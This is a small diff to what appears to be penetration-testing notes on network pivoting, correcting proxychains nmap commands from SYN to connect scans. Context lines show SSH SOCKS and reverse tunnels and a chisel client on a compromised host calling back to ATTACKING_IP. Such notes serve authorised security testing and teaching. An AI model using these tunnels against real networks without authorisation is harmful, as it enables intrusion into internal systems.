@@ -80,7 +80,7 @@ v4resk@kali$ ssh -D 127.0.0.1:9090 user@jump-server.net -fN
 Once configured, you can use `proxychains` to run applications through the proxy network connections.
 
 ```bash
-v4resk@kali$ proxychains nmap -sS <IP_ACCESSIBLE_FROM_JUMP_BOX>
+v4resk@kali$ proxychains nmap -sT <IP_ACCESSIBLE_FROM_JUMP_BOX>
 ```
 
 {% hint style="info" %}
@@ -104,7 +104,7 @@ PC> ssh -R 9090 tunneluser@ATTACKING_IP -fN
 Once configured, you can use `proxychains` to run applications through the proxy network connections.
 
 ```bash
-v4resk@kali$ proxychains nmap -sS <IP_ACCESSIBLE_FROM_JUMP_BOX>
+v4resk@kali$ proxychains nmap -sT <IP_ACCESSIBLE_FROM_JUMP_BOX>
 ```
 
 {% hint style="info" %}
@@ -185,7 +185,7 @@ www-data@pwned.lab$ ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
 Once configured, you can use `proxychains` to run applications through the proxy network connection.
 
 ```bash
-proxychains nmap -sS <IP_ACCESSIBLE_FROM_JUMP_BOX>
+proxychains nmap -sT <IP_ACCESSIBLE_FROM_JUMP_BOX>
 ```
 
 {% hint style="info" %}
